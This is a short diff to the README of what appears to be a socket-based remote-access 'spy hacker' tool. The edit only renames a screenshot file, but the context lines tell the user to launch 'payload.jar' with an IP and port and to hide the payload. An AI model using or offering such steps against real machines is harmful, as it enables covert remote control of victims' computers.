@@ -10,6 +10,6 @@ simple scripts based on the socket to open a session between the target and the 
 4)  type this command to lunch the payload : java -jar payload.jar 192.168.1.1 8080 (as an example for ip address and port number)
 5) you can hide the payload (see the video below)
 # screenshot
-![](spy hacker Capture.png)
+![](spy_hacker_capture.png)
 
 
